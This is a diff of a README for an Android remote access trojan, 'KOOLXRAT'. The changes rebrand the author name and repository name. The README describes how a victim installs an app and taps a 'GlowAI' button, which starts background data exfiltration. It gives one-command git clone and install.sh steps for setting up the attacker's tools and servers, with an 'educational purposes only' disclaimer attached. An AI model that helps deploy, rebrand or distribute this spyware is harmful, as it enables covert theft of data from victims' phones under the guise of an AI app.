@@ -1,4 +1,4 @@
-# 🛠 KOOLXRAT (Exclusive by kool_efx)
+# 🛠 KOOLXRAT (Exclusive by dark_efx)
 
 **Platform Flow:**
 - 📱 Victim Device → Android
@@ -24,8 +24,8 @@ Once the victim installs the app and taps the **GlowAI** button:
 1.Use the auto script to install all required tools and servers in one command:
 
 ```bash
-git clone https://github.com/koolefx/KOOLXRAT-data.git
-cd KOOLXRAT-data
+git clone https://github.com/koolefx/darkXRAT-data.git
+cd darkXRAT-data
 chmod +x install.sh
 ./install.sh
 ```
@@ -45,7 +45,7 @@ Once installed, the victim taps GlowAI, and data exfiltration begins in the back
 🧾 Legal & Credits
 🔒 This project is for educational and cybersecurity testing purposes only.
 
-👨‍💻 Authored 100% by kool_efx — no external scripts, clones, or copied code were used.  Special Thanks to [@74lg0](https://github.com/74lg0) for the help!
+👨‍💻 Authored 100% by dark_efx — no external scripts, clones, or copied code were used.  Special Thanks to [@74lg0](https://github.com/74lg0) for the help!
 
 ❗ Unauthorized use for malicious purposes is strictly discouraged.
 
